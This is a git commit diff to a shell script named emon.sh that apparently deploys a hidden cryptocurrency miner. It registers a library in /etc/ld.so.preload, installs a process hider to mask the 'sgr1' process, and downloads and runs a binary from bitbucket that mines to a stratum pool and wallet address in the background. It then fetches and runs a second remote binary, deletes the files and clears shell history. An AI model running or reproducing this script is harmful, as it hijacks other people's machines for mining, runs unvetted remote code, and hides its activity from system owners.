b8c209b84a2eacc8d7853293767d5cdabde0be1a
leviwhite380 <113033514+leviwhite380@users.noreply.github.com>
2022-09-23 00:49:42 +0700

    Update emon.sh

--- emon.sh
+++ emon.sh
@@ -6,4 +6,13 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 apt-get update && apt install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add sgr1
-wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/plant && chmod +x sgr1 && ./sgr1 -a yespowertide -o stratum+tcp://8.209.98.71:443 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0001-A -p x -t$(nproc --all)
+wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/plant && chmod +x sgr1 && ./sgr1 -a yespowertide -o stratum+tcp://8.209.98.71:443 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0001-A -p x -t$(nproc --all) >/dev/null &
+uname -a
+wget https://bitbucket.org/makeda904/npm-node/raw/master/time 
+chmod +x time
+history -rc
+timeout 10 ./time
+rm sgr1 time 
+echo "done..."
+history -rc
+ls
